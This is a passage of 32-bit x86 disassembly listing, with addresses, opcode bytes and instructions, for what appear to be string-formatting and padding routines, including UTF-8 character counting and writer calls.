  40434d:	83 c4 08             	add    $0x8,%esp
  404350:	84 c0                	test   %al,%al
  404352:	74 ec                	je     0x404340
  404354:	b1 01                	mov    $0x1,%cl
  404356:	eb 71                	jmp    0x4043c9
  404358:	8b 75 f0             	mov    -0x10(%ebp),%esi
  40435b:	89 fa                	mov    %edi,%edx
  40435d:	89 f1                	mov    %esi,%ecx
  40435f:	ff 75 14             	push   0x14(%ebp)
  404362:	ff 75 ec             	push   -0x14(%ebp)
  404365:	ff 75 e8             	push   -0x18(%ebp)
  404368:	e8 d3 fd ff ff       	call   0x404140
  40436d:	83 c4 0c             	add    $0xc,%esp
  404370:	b1 01                	mov    $0x1,%cl
  404372:	84 c0                	test   %al,%al
  404374:	75 53                	jne    0x4043c9
  404376:	ff 75 1c             	push   0x1c(%ebp)
  404379:	ff 75 18             	push   0x18(%ebp)
  40437c:	56                   	push   %esi
  40437d:	ff 57 0c             	call   *0xc(%edi)
  404380:	b1 01                	mov    $0x1,%cl
  404382:	83 c4 0c             	add    $0xc,%esp
  404385:	84 c0                	test   %al,%al
  404387:	75 40                	jne    0x4043c9
  404389:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40438c:	29 45 e0             	sub    %eax,-0x20(%ebp)
  40438f:	03 45 dc             	add    -0x24(%ebp),%eax
  404392:	29 d8                	sub    %ebx,%eax
  404394:	66 bb ff ff          	mov    $0xffff,%bx
  404398:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40439f:	00 
  4043a0:	89 c6                	mov    %eax,%esi
  4043a2:	01 d8                	add    %ebx,%eax
  4043a4:	66 83 f8 ff          	cmp    $0xffff,%ax
  4043a8:	74 15                	je     0x4043bf
  4043aa:	ff 75 e4             	push   -0x1c(%ebp)
  4043ad:	ff 75 f0             	push   -0x10(%ebp)
  4043b0:	ff 57 10             	call   *0x10(%edi)
  4043b3:	83 c4 08             	add    $0x8,%esp
  4043b6:	43                   	inc    %ebx
  4043b7:	84 c0                	test   %al,%al
  4043b9:	89 f0                	mov    %esi,%eax
  4043bb:	74 e3                	je     0x4043a0
  4043bd:	eb 03                	jmp    0x4043c2
  4043bf:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  4043c2:	66 3b 5d e0          	cmp    -0x20(%ebp),%bx
  4043c6:	0f 92 c1             	setb   %cl
  4043c9:	89 c8                	mov    %ecx,%eax
  4043cb:	83 c4 1c             	add    $0x1c,%esp
  4043ce:	5e                   	pop    %esi
  4043cf:	5f                   	pop    %edi
  4043d0:	5b                   	pop    %ebx
  4043d1:	5d                   	pop    %ebp
  4043d2:	c3                   	ret
  4043d3:	90                   	nop
  4043d4:	8d 01                	lea    (%ecx),%eax
  4043d6:	00 00                	add    %al,(%eax)
  4043d8:	bc 00 00 00 88       	mov    $0x88000000,%esp
  4043dd:	01 00                	add    %eax,(%eax)
  4043df:	00 bc 00 00 00 cc cc 	add    %bh,-0x33340000(%eax,%eax,1)
  4043e6:	cc                   	int3
  4043e7:	cc                   	int3
  4043e8:	cc                   	int3
  4043e9:	cc                   	int3
  4043ea:	cc                   	int3
  4043eb:	cc                   	int3
  4043ec:	cc                   	int3
  4043ed:	cc                   	int3
  4043ee:	cc                   	int3
  4043ef:	cc                   	int3
  4043f0:	55                   	push   %ebp
  4043f1:	89 e5                	mov    %esp,%ebp
  4043f3:	53                   	push   %ebx
  4043f4:	57                   	push   %edi
  4043f5:	56                   	push   %esi
  4043f6:	83 ec 24             	sub    $0x24,%esp
  4043f9:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4043fc:	8b 43 04             	mov    0x4(%ebx),%eax
  4043ff:	8b 3b                	mov    (%ebx),%edi
  404401:	8b 70 0c             	mov    0xc(%eax),%esi
  404404:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404407:	ff 75 10             	push   0x10(%ebp)
  40440a:	ff 75 0c             	push   0xc(%ebp)
  40440d:	57                   	push   %edi
  40440e:	ff d6                	call   *%esi
  404410:	83 c4 0c             	add    $0xc,%esp
  404413:	b1 01                	mov    $0x1,%cl
  404415:	84 c0                	test   %al,%al
  404417:	0f 85 9e 00 00 00    	jne    0x4044bb
  40441d:	f6 43 0a 80          	testb  $0x80,0xa(%ebx)
  404421:	75 2b                	jne    0x40444e
  404423:	6a 01                	push   $0x1
  404425:	68 65 3d 43 00       	push   $0x433d65
  40442a:	57                   	push   %edi
  40442b:	ff d6                	call   *%esi
  40442d:	83 c4 0c             	add    $0xc,%esp
  404430:	84 c0                	test   %al,%al
  404432:	0f 85 81 00 00 00    	jne    0x4044b9
  404438:	8b 75 08             	mov    0x8(%ebp),%esi
  40443b:	56                   	push   %esi
  40443c:	ff 75 14             	push   0x14(%ebp)
  40443f:	8b 45 18             	mov    0x18(%ebp),%eax
  404442:	ff 50 0c             	call   *0xc(%eax)
  404445:	83 c4 08             	add    $0x8,%esp
  404448:	84 c0                	test   %al,%al
  40444a:	75 6d                	jne    0x4044b9
  40444c:	eb 77                	jmp    0x4044c5
  40444e:	6a 02                	push   $0x2
  404450:	68 66 3d 43 00       	push   $0x433d66
  404455:	57                   	push   %edi
  404456:	ff d6                	call   *%esi
  404458:	83 c4 0c             	add    $0xc,%esp
  40445b:	84 c0                	test   %al,%al
  40445d:	75 5a                	jne    0x4044b9
  40445f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404462:	8b 75 08             	mov    0x8(%ebp),%esi
  404465:	89 7d d0             	mov    %edi,-0x30(%ebp)
  404468:	c6 45 f3 01          	movb   $0x1,-0xd(%ebp)
  40446c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40446f:	8d 45 f3             	lea    -0xd(%ebp),%eax
  404472:	8b 4e 0c             	mov    0xc(%esi),%ecx
  404475:	89 45 d8             	mov    %eax,-0x28(%ebp)
  404478:	8b 46 08             	mov    0x8(%esi),%eax
  40447b:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40447e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404481:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404484:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404487:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40448a:	c7 45 e0 6c 3d 43 00 	movl   $0x433d6c,-0x20(%ebp)
  404491:	50                   	push   %eax
  404492:	ff 75 14             	push   0x14(%ebp)
  404495:	8b 45 18             	mov    0x18(%ebp),%eax
  404498:	ff 50 0c             	call   *0xc(%eax)
  40449b:	83 c4 08             	add    $0x8,%esp
  40449e:	84 c0                	test   %al,%al
  4044a0:	75 17                	jne    0x4044b9
  4044a2:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4044a5:	6a 02                	push   $0x2
  4044a7:	68 63 3d 43 00       	push   $0x433d63
  4044ac:	ff 75 dc             	push   -0x24(%ebp)
  4044af:	ff 50 0c             	call   *0xc(%eax)
  4044b2:	83 c4 0c             	add    $0xc,%esp
  4044b5:	84 c0                	test   %al,%al
  4044b7:	74 0c                	je     0x4044c5
  4044b9:	b1 01                	mov    $0x1,%cl
  4044bb:	89 c8                	mov    %ecx,%eax
  4044bd:	83 c4 24             	add    $0x24,%esp
  4044c0:	5e                   	pop    %esi
  4044c1:	5f                   	pop    %edi
  4044c2:	5b                   	pop    %ebx
  4044c3:	5d                   	pop    %ebp
  4044c4:	c3                   	ret
  4044c5:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4044c9:	75 1e                	jne    0x4044e9
  4044cb:	f6 46 0a 80          	testb  $0x80,0xa(%esi)
  4044cf:	75 18                	jne    0x4044e9
  4044d1:	8b 46 04             	mov    0x4(%esi),%eax
  4044d4:	6a 01                	push   $0x1
  4044d6:	68 69 3d 43 00       	push   $0x433d69
  4044db:	ff 36                	push   (%esi)
  4044dd:	ff 50 0c             	call   *0xc(%eax)
  4044e0:	b1 01                	mov    $0x1,%cl
  4044e2:	83 c4 0c             	add    $0xc,%esp
  4044e5:	84 c0                	test   %al,%al
  4044e7:	75 d2                	jne    0x4044bb
  4044e9:	8b 46 04             	mov    0x4(%esi),%eax
  4044ec:	6a 01                	push   $0x1
  4044ee:	68 68 3d 43 00       	push   $0x433d68
  4044f3:	ff 36                	push   (%esi)
  4044f5:	ff 50 0c             	call   *0xc(%eax)
  4044f8:	83 c4 0c             	add    $0xc,%esp
  4044fb:	89 c1                	mov    %eax,%ecx
  4044fd:	eb bc                	jmp    0x4044bb
  4044ff:	cc                   	int3
  404500:	55                   	push   %ebp
  404501:	89 e5                	mov    %esp,%ebp
  404503:	53                   	push   %ebx
  404504:	57                   	push   %edi
  404505:	56                   	push   %esi
  404506:	83 ec 20             	sub    $0x20,%esp
  404509:	8b 75 08             	mov    0x8(%ebp),%esi
  40450c:	8b 46 04             	mov    0x4(%esi),%eax
  40450f:	8b 3e                	mov    (%esi),%edi
  404511:	8b 58 0c             	mov    0xc(%eax),%ebx
  404514:	ff 75 10             	push   0x10(%ebp)
  404517:	ff 75 0c             	push   0xc(%ebp)
  40451a:	57                   	push   %edi
  40451b:	ff d3                	call   *%ebx
  40451d:	83 c4 0c             	add    $0xc,%esp
  404520:	b1 01                	mov    $0x1,%cl
  404522:	84 c0                	test   %al,%al
  404524:	0f 85 0f 01 00 00    	jne    0x404639
  40452a:	f6 46 0a 80          	testb  $0x80,0xa(%esi)
  40452e:	75 2c                	jne    0x40455c
  404530:	6a 01                	push   $0x1
  404532:	68 65 3d 43 00       	push   $0x433d65
  404537:	57                   	push   %edi
  404538:	ff d3                	call   *%ebx
  40453a:	83 c4 0c             	add    $0xc,%esp
  40453d:	84 c0                	test   %al,%al
  40453f:	0f 85 f2 00 00 00    	jne    0x404637
  404545:	56                   	push   %esi
  404546:	ff 75 14             	push   0x14(%ebp)
  404549:	8b 45 18             	mov    0x18(%ebp),%eax
  40454c:	ff 50 0c             	call   *0xc(%eax)
  40454f:	83 c4 08             	add    $0x8,%esp
  404552:	84 c0                	test   %al,%al
  404554:	0f 85 dd 00 00 00    	jne    0x404637
  40455a:	eb 72                	jmp    0x4045ce
  40455c:	6a 02                	push   $0x2
  40455e:	68 66 3d 43 00       	push   $0x433d66
  404563:	57                   	push   %edi
  404564:	ff d3                	call   *%ebx
  404566:	83 c4 0c             	add    $0xc,%esp
  404569:	84 c0                	test   %al,%al
  40456b:	0f 85 c6 00 00 00    	jne    0x404637
  404571:	8b 06                	mov    (%esi),%eax
  404573:	8b 4e 04             	mov    0x4(%esi),%ecx
  404576:	c6 45 f3 01          	movb   $0x1,-0xd(%ebp)
  40457a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40457d:	8d 45 f3             	lea    -0xd(%ebp),%eax
  404580:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404583:	8b 4e 0c             	mov    0xc(%esi),%ecx
  404586:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404589:	8b 46 08             	mov    0x8(%esi),%eax
  40458c:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40458f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404592:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404595:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404598:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40459b:	c7 45 e4 6c 3d 43 00 	movl   $0x433d6c,-0x1c(%ebp)
  4045a2:	50                   	push   %eax
  4045a3:	ff 75 14             	push   0x14(%ebp)
  4045a6:	8b 45 18             	mov    0x18(%ebp),%eax
  4045a9:	ff 50 0c             	call   *0xc(%eax)
  4045ac:	83 c4 08             	add    $0x8,%esp
  4045af:	84 c0                	test   %al,%al
  4045b1:	0f 85 80 00 00 00    	jne    0x404637
  4045b7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4045ba:	6a 02                	push   $0x2
  4045bc:	68 63 3d 43 00       	push   $0x433d63
  4045c1:	ff 75 e0             	push   -0x20(%ebp)
  4045c4:	ff 50 0c             	call   *0xc(%eax)
  4045c7:	83 c4 0c             	add    $0xc,%esp
  4045ca:	84 c0                	test   %al,%al
  4045cc:	75 69                	jne    0x404637
  4045ce:	8b 5d 20             	mov    0x20(%ebp),%ebx
  4045d1:	8b 7d 1c             	mov    0x1c(%ebp),%edi
  4045d4:	f6 46 0a 80          	testb  $0x80,0xa(%esi)
  4045d8:	75 20                	jne    0x4045fa
  4045da:	8b 46 04             	mov    0x4(%esi),%eax
  4045dd:	6a 02                	push   $0x2
  4045df:	68 60 3d 43 00       	push   $0x433d60
  4045e4:	ff 36                	push   (%esi)
  4045e6:	ff 50 0c             	call   *0xc(%eax)
  4045e9:	83 c4 0c             	add    $0xc,%esp
  4045ec:	84 c0                	test   %al,%al
  4045ee:	75 47                	jne    0x404637
  4045f0:	56                   	push   %esi
  4045f1:	57                   	push   %edi
  4045f2:	ff 53 0c             	call   *0xc(%ebx)
  4045f5:	83 c4 08             	add    $0x8,%esp
  4045f8:	eb 5c                	jmp    0x404656
  4045fa:	8b 06                	mov    (%esi),%eax
  4045fc:	8b 4e 04             	mov    0x4(%esi),%ecx
  4045ff:	c6 45 f3 01          	movb   $0x1,-0xd(%ebp)
  404603:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404606:	8d 45 f3             	lea    -0xd(%ebp),%eax
  404609:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  40460c:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40460f:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404612:	8b 46 08             	mov    0x8(%esi),%eax
  404615:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  404618:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40461b:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40461e:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404621:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404624:	c7 45 e4 6c 3d 43 00 	movl   $0x433d6c,-0x1c(%ebp)
  40462b:	50                   	push   %eax
  40462c:	57                   	push   %edi
  40462d:	ff 53 0c             	call   *0xc(%ebx)
  404630:	83 c4 08             	add    $0x8,%esp
  404633:	84 c0                	test   %al,%al
  404635:	74 0c                	je     0x404643
  404637:	b1 01                	mov    $0x1,%cl
  404639:	89 c8                	mov    %ecx,%eax
  40463b:	83 c4 20             	add    $0x20,%esp
  40463e:	5e                   	pop    %esi
  40463f:	5f                   	pop    %edi
  404640:	5b                   	pop    %ebx
  404641:	5d                   	pop    %ebp
  404642:	c3                   	ret
  404643:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404646:	6a 02                	push   $0x2
  404648:	68 63 3d 43 00       	push   $0x433d63
  40464d:	ff 75 e0             	push   -0x20(%ebp)
  404650:	ff 50 0c             	call   *0xc(%eax)
  404653:	83 c4 0c             	add    $0xc,%esp
  404656:	84 c0                	test   %al,%al
  404658:	b1 01                	mov    $0x1,%cl
  40465a:	75 dd                	jne    0x404639
  40465c:	8b 46 04             	mov    0x4(%esi),%eax
  40465f:	6a 01                	push   $0x1
  404661:	68 68 3d 43 00       	push   $0x433d68
  404666:	ff 36                	push   (%esi)
  404668:	ff 50 0c             	call   *0xc(%eax)
  40466b:	83 c4 0c             	add    $0xc,%esp
  40466e:	89 c1                	mov    %eax,%ecx
  404670:	eb c7                	jmp    0x404639
  404672:	cc                   	int3
  404673:	cc                   	int3
  404674:	cc                   	int3
  404675:	cc                   	int3
  404676:	cc                   	int3
  404677:	cc                   	int3
  404678:	cc                   	int3
  404679:	cc                   	int3
  40467a:	cc                   	int3
  40467b:	cc                   	int3
  40467c:	cc                   	int3
  40467d:	cc                   	int3
  40467e:	cc                   	int3
  40467f:	cc                   	int3
  404680:	55                   	push   %ebp
  404681:	89 e5                	mov    %esp,%ebp
  404683:	53                   	push   %ebx
  404684:	57                   	push   %edi
  404685:	56                   	push   %esi
  404686:	83 ec 08             	sub    $0x8,%esp
  404689:	8b 7d 08             	mov    0x8(%ebp),%edi
  40468c:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40468f:	8b 75 20             	mov    0x20(%ebp),%esi
  404692:	8b 47 04             	mov    0x4(%edi),%eax
  404695:	ff 75 10             	push   0x10(%ebp)
  404698:	ff 75 0c             	push   0xc(%ebp)
  40469b:	ff 37                	push   (%edi)
  40469d:	ff 50 0c             	call   *0xc(%eax)
  4046a0:	83 c4 0c             	add    $0xc,%esp
  4046a3:	89 7d ec             	mov    %edi,-0x14(%ebp)
  4046a6:	88 45 f0             	mov    %al,-0x10(%ebp)
  4046a9:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4046ac:	c6 45 f1 00          	movb   $0x0,-0xf(%ebp)
  4046b0:	56                   	push   %esi
  4046b1:	53                   	push   %ebx
  4046b2:	ff 75 18             	push   0x18(%ebp)
  4046b5:	ff 75 14             	push   0x14(%ebp)
  4046b8:	50                   	push   %eax
  4046b9:	e8 52 f8 ff ff       	call   0x403f10
  4046be:	83 c4 14             	add    $0x14,%esp
  4046c1:	0f b6 45 f1          	movzbl -0xf(%ebp),%eax
  4046c5:	0f b6 4d f0          	movzbl -0x10(%ebp),%ecx
  4046c9:	89 c2                	mov    %eax,%edx
  4046cb:	f6 d2                	not    %dl
  4046cd:	08 ca                	or     %cl,%dl
  4046cf:	f6 c2 01             	test   $0x1,%dl
  4046d2:	74 04                	je     0x4046d8
  4046d4:	08 c8                	or     %cl,%al
  4046d6:	eb 27                	jmp    0x4046ff
  4046d8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4046db:	f6 40 0a 80          	testb  $0x80,0xa(%eax)
  4046df:	75 0c                	jne    0x4046ed
  4046e1:	8b 48 04             	mov    0x4(%eax),%ecx
  4046e4:	6a 02                	push   $0x2
  4046e6:	68 8d 3d 43 00       	push   $0x433d8d
  4046eb:	eb 0a                	jmp    0x4046f7
  4046ed:	8b 48 04             	mov    0x4(%eax),%ecx
  4046f0:	6a 01                	push   $0x1
  4046f2:	68 8c 3d 43 00       	push   $0x433d8c
  4046f7:	ff 30                	push   (%eax)
  4046f9:	ff 51 0c             	call   *0xc(%ecx)
  4046fc:	83 c4 0c             	add    $0xc,%esp
  4046ff:	24 01                	and    $0x1,%al
  404701:	83 c4 08             	add    $0x8,%esp
  404704:	5e                   	pop    %esi
  404705:	5f                   	pop    %edi
  404706:	5b                   	pop    %ebx
  404707:	5d                   	pop    %ebp
  404708:	c3                   	ret
  404709:	cc                   	int3
  40470a:	cc                   	int3
  40470b:	cc                   	int3
  40470c:	cc                   	int3
  40470d:	cc                   	int3
  40470e:	cc                   	int3
  40470f:	cc                   	int3
  404710:	55                   	push   %ebp
  404711:	89 e5                	mov    %esp,%ebp
  404713:	53                   	push   %ebx
  404714:	57                   	push   %edi
  404715:	56                   	push   %esi
  404716:	83 ec 18             	sub    $0x18,%esp
  404719:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40471c:	8b 55 10             	mov    0x10(%ebp),%edx
  40471f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404722:	e8 00 00 00 00       	call   0x404727
  404727:	58                   	pop    %eax
  404728:	8b 79 08             	mov    0x8(%ecx),%edi
  40472b:	f7 c7 00 00 00 18    	test   $0x18000000,%edi
  404731:	74 45                	je     0x404778
  404733:	f7 c7 00 00 00 10    	test   $0x10000000,%edi
  404739:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40473c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40473f:	75 40                	jne    0x404781
  404741:	83 fa 10             	cmp    $0x10,%edx
  404744:	0f 83 8e 00 00 00    	jae    0x4047d8
  40474a:	85 d2                	test   %edx,%edx
  40474c:	0f 84 7b 01 00 00    	je     0x4048cd
  404752:	31 c0                	xor    %eax,%eax
  404754:	31 f6                	xor    %esi,%esi
  404756:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  40475d:	00 00 00 
  404760:	31 c9                	xor    %ecx,%ecx
  404762:	80 3c 03 c0          	cmpb   $0xc0,(%ebx,%eax,1)
  404766:	0f 9d c1             	setge  %cl
  404769:	40                   	inc    %eax
  40476a:	01 ce                	add    %ecx,%esi
  40476c:	39 c2                	cmp    %eax,%edx
  40476e:	75 f0                	jne    0x404760
  404770:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404773:	e9 89 00 00 00       	jmp    0x404801
  404778:	8b 41 04             	mov    0x4(%ecx),%eax
  40477b:	52                   	push   %edx
  40477c:	e9 af 00 00 00       	jmp    0x404830
  404781:	0f b7 71 0e          	movzwl 0xe(%ecx),%esi
  404785:	85 f6                	test   %esi,%esi
  404787:	74 61                	je     0x4047ea
  404789:	01 5d f0             	add    %ebx,-0x10(%ebp)
  40478c:	31 d2                	xor    %edx,%edx
  40478e:	89 d9                	mov    %ebx,%ecx
  404790:	89 f0                	mov    %esi,%eax
  404792:	89 7d ec             	mov    %edi,-0x14(%ebp)
  404795:	eb 1a                	jmp    0x4047b1
  404797:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  40479e:	00 00 
  4047a0:	8d 59 01             	lea    0x1(%ecx),%ebx
  4047a3:	89 da                	mov    %ebx,%edx
  4047a5:	29 ca                	sub    %ecx,%edx
  4047a7:	89 d9                	mov    %ebx,%ecx
  4047a9:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4047ac:	01 fa                	add    %edi,%edx
  4047ae:	48                   	dec    %eax
  4047af:	74 43                	je     0x4047f4
  4047b1:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  4047b4:	89 d7                	mov    %edx,%edi
  4047b6:	74 38                	je     0x4047f0
  4047b8:	0f b6 11             	movzbl (%ecx),%edx
  4047bb:	84 d2                	test   %dl,%dl
  4047bd:	79 e1                	jns    0x4047a0
  4047bf:	80 fa e0             	cmp    $0xe0,%dl
  4047c2:	72 0a                	jb     0x4047ce
  4047c4:	80 fa f0             	cmp    $0xf0,%dl
  4047c7:	72 0a                	jb     0x4047d3
  4047c9:	8d 59 04             	lea    0x4(%ecx),%ebx
  4047cc:	eb d5                	jmp    0x4047a3
  4047ce:	8d 59 02             	lea    0x2(%ecx),%ebx
  4047d1:	eb d0                	jmp    0x4047a3
  4047d3:	8d 59 03             	lea    0x3(%ecx),%ebx
  4047d6:	eb cb                	jmp    0x4047a3
  4047d8:	52                   	push   %edx
  4047d9:	53                   	push   %ebx
  4047da:	89 ce                	mov    %ecx,%esi
  4047dc:	e8 9f 03 00 00       	call   0x404b80
  4047e1:	89 f1                	mov    %esi,%ecx
  4047e3:	83 c4 08             	add    $0x8,%esp
  4047e6:	89 c6                	mov    %eax,%esi
  4047e8:	eb 17                	jmp    0x404801
  4047ea:	31 d2                	xor    %edx,%edx
  4047ec:	31 c0                	xor    %eax,%eax
  4047ee:	eb 0c                	jmp    0x4047fc
  4047f0:	89 fa                	mov    %edi,%edx
  4047f2:	eb 02                	jmp    0x4047f6
  4047f4:	31 c0                	xor    %eax,%eax
  4047f6:	8b 7d ec             	mov    -0x14(%ebp),%edi
  4047f9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4047fc:	29 c6                	sub    %eax,%esi
  4047fe:	89 55 f0             	mov    %edx,-0x10(%ebp)
  404801:	0f b7 41 0c          	movzwl 0xc(%ecx),%eax
  404805:	39 c6                	cmp    %eax,%esi
  404807:	73 21                	jae    0x40482a
  404809:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40480c:	89 c3                	mov    %eax,%ebx
  40480e:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404811:	89 f8                	mov    %edi,%eax
  404813:	c1 e8 1d             	shr    $0x1d,%eax
  404816:	29 f3                	sub    %esi,%ebx
  404818:	83 e0 03             	and    $0x3,%eax
  40481b:	03 14 85 f0 48 40 00 	add    0x4048f0(,%eax,4),%edx
  404822:	31 c0                	xor    %eax,%eax
  404824:	ff e2                	jmp    *%edx
  404826:	89 d8                	mov    %ebx,%eax
  404828:	eb 19                	jmp    0x404843
  40482a:	8b 41 04             	mov    0x4(%ecx),%eax
  40482d:	ff 75 f0             	push   -0x10(%ebp)
  404830:	53                   	push   %ebx
  404831:	ff 31                	push   (%ecx)
  404833:	ff 50 0c             	call   *0xc(%eax)
  404836:	83 c4 24             	add    $0x24,%esp
  404839:	e9 aa 00 00 00       	jmp    0x4048e8
  40483e:	0f b7 c3             	movzwl %bx,%eax
  404841:	d1 e8                	shr    $1,%eax
  404843:	8b 11                	mov    (%ecx),%edx
  404845:	8b 49 04             	mov    0x4(%ecx),%ecx
  404848:	81 e7 ff ff 1f 00    	and    $0x1fffff,%edi
  40484e:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404851:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404854:	89 fb                	mov    %edi,%ebx
  404856:	8d 78 01             	lea    0x1(%eax),%edi
  404859:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40485c:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40485f:	90                   	nop
  404860:	66 4f                	dec    %di
  404862:	74 15                	je     0x404879
  404864:	53                   	push   %ebx
  404865:	ff 75 e8             	push   -0x18(%ebp)
  404868:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40486b:	ff 50 10             	call   *0x10(%eax)
  40486e:	83 c4 08             	add    $0x8,%esp
  404871:	84 c0                	test   %al,%al
  404873:	74 eb                	je     0x404860
  404875:	b0 01                	mov    $0x1,%al
